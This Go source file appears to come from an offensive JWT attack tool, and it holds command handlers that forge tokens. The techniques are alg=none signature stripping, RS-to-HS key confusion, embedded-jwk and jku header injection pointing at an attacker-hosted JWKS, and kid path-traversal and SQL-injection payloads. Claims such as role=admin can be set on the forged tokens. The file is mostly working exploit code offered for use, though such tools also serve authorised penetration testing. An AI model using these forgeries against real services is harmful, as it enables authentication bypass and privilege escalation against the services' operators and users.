package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/MRvirusIR/clavis/internal/attack"
	"github.com/MRvirusIR/clavis/internal/jwt"
	"github.com/MRvirusIR/clavis/internal/ui"
)

func baseToken(tok string, rest []string) *jwt.Token {
	tk, err := readToken(tok, rest)
	if err != nil {
		ui.Bad(err.Error())
		return nil
	}
	return mustParse(tk)
}

func cmdAlgNone(args []string) int {
	var sets multiSet
	fs := flag.NewFlagSet("alg-none", flag.ContinueOnError)
	tok := fs.String("t", "", "base JWT")
	all := fs.Bool("all", false, "print every casing variant (none/None/NONE/nOnE)")
	fs.Var(&sets, "set", "set a claim: -set role=admin (repeatable)")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	t := baseToken(*tok, fs.Args())
	if t == nil {
		return 1
	}
	kv := jwt.ParseKV(sets)
	if *all {
		ui.Info("alg=none variants (try each against the target):")
		for name, tk := range attack.AlgNoneVariants(t, kv) {
			ui.Section(name)
			fmt.Println(tk)
		}
		return 0
	}
	tk, _ := attack.AlgNone(t, kv, "none")
	ui.OK("forged alg=none token (no signature)")
	printToken(tk)
	return 0
}

func cmdConfuse(args []string) int {
	var sets multiSet
	fs := flag.NewFlagSet("confuse", flag.ContinueOnError)
	tok := fs.String("t", "", "base RS*/ES* JWT")
	pub := fs.String("pub", "", "the server's PUBLIC key file (PEM or JWK)")
	hsAlg := fs.String("alg", "HS256", "target HMAC alg")
	all := fs.Bool("all", false, "print all public-key byte-form variants")
	fs.Var(&sets, "set", "set a claim: -set role=admin (repeatable)")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if *pub == "" {
		ui.Bad("confuse needs -pub <public.pem> (the key the server verifies with)")
		return 2
	}
	t := baseToken(*tok, fs.Args())
	if t == nil {
		return 1
	}
	raw, err := os.ReadFile(*pub)
	if err != nil {
		ui.Bad(err.Error())
		return 2
	}
	norm, err := attack.NormalizePublic(raw)
	if err != nil {
		ui.Warn("could not normalize public key, using file bytes as-is")
		norm = raw
	}
	kv := jwt.ParseKV(sets)
	if *all {
		ui.Info("RS→HS confusion: trying multiple key byte-forms")
		for name, tk := range attack.ConfuseVariants(t, norm, kv, *hsAlg) {
			ui.Section(name)
			fmt.Println(tk)
		}
		ui.Info("also try the original (non-normalized) file bytes if these fail")
		return 0
	}
	tk, err := attack.Confuse(t, norm, kv, *hsAlg)
	if err != nil {
		ui.Bad(err.Error())
		return 1
	}
	ui.OK("forged %s token signed with the public key as HMAC secret", *hsAlg)
	printToken(tk)
	return 0
}

func cmdJWKInject(args []string) int {
	var sets multiSet
	fs := flag.NewFlagSet("jwk-inject", flag.ContinueOnError)
	tok := fs.String("t", "", "base JWT")
	bits := fs.Int("bits", 2048, "RSA key size for the embedded key")
	showKey := fs.Bool("show-key", false, "also print the generated private key (PEM)")
	fs.Var(&sets, "set", "set a claim: -set role=admin (repeatable)")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	t := baseToken(*tok, fs.Args())
	if t == nil {
		return 1
	}
	kv := jwt.ParseKV(sets)
	tk, priv, err := attack.JWKInject(t, kv, *bits)
	if err != nil {
		ui.Bad(err.Error())
		return 1
	}
	ui.OK("forged token with a self-signed embedded jwk header")
	printToken(tk)
	if *showKey {
		ui.Section("generated private key")
		fmt.Println(priv)
	}
	return 0
}

func cmdJKUInject(args []string) int {
	var sets multiSet
	fs := flag.NewFlagSet("jku-inject", flag.ContinueOnError)
	tok := fs.String("t", "", "base JWT")
	jku := fs.String("jku", "", "URL where you will host the JWKS (required)")
	out := fs.String("jwks-out", "", "write the JWKS JSON to this file (else stdout)")
	bits := fs.Int("bits", 2048, "RSA key size")
	showKey := fs.Bool("show-key", false, "also print the generated private key (PEM)")
	fs.Var(&sets, "set", "set a claim: -set role=admin (repeatable)")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if *jku == "" {
		ui.Bad("jku-inject needs -jku <https://you/.well-known/jwks.json>")
		return 2
	}
	t := baseToken(*tok, fs.Args())
	if t == nil {
		return 1
	}
	kv := jwt.ParseKV(sets)
	tk, jwks, priv, err := attack.JKUInject(t, kv, *jku, *bits)
	if err != nil {
		ui.Bad(err.Error())
		return 1
	}
	ui.OK("forged token pointing jku at %s", *jku)
	printToken(tk)
	if *out != "" {
		if err := os.WriteFile(*out, []byte(jwks), 0o644); err != nil {
			ui.Bad("writing jwks: %v", err)
		} else {
			ui.Info("JWKS written to %s — host it at the jku URL", *out)
		}
	} else {
		ui.Section("JWKS to host at the jku URL")
		fmt.Println(jwks)
	}
	if *showKey {
		ui.Section("generated private key")
		fmt.Println(priv)
	}
	return 0
}

func cmdKidInject(args []string) int {
	var sets multiSet
	fs := flag.NewFlagSet("kid-inject", flag.ContinueOnError)
	tok := fs.String("t", "", "base JWT")
	kid := fs.String("kid", "", "kid value to inject (e.g. ../../../../dev/null)")
	key := fs.String("key", "", "the HMAC secret that kid resolves to (empty for /dev/null)")
	hsAlg := fs.String("alg", "HS256", "target HMAC alg")
	sqli := fs.Bool("sqli", false, "wrap -key in a UNION SELECT SQLi kid payload")
	presets := fs.Bool("presets", false, "print tokens for common path-traversal kid presets")
	fs.Var(&sets, "set", "set a claim: -set role=admin (repeatable)")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	t := baseToken(*tok, fs.Args())
	if t == nil {
		return 1
	}
	kv := jwt.ParseKV(sets)

	if *presets {
		ui.Info("kid path-traversal presets (try each; signed with the implied key):")
		for _, p := range attack.KidTraversalPresets {
			tk, err := attack.KidInject(t, kv, p.Kid, p.Key, *hsAlg)
			if err != nil {
				continue
			}
			ui.Section(p.Note)
			fmt.Printf("  kid: %s\n", p.Kid)
			fmt.Println(tk)
		}
		return 0
	}

	if *kid == "" {
		ui.Bad("kid-inject needs -kid <value> (or use -presets)")
		return 2
	}
	kidVal := *kid
	if *sqli {
		kidVal = attack.KidSQLi(*key)
		ui.Info("using SQLi kid: %s", kidVal)
	}
	tk, err := attack.KidInject(t, kv, kidVal, *key, *hsAlg)
	if err != nil {
		ui.Bad(err.Error())
		return 1
	}
	ui.OK("forged token with injected kid, signed with the given key")
	printToken(tk)
	return 0
}
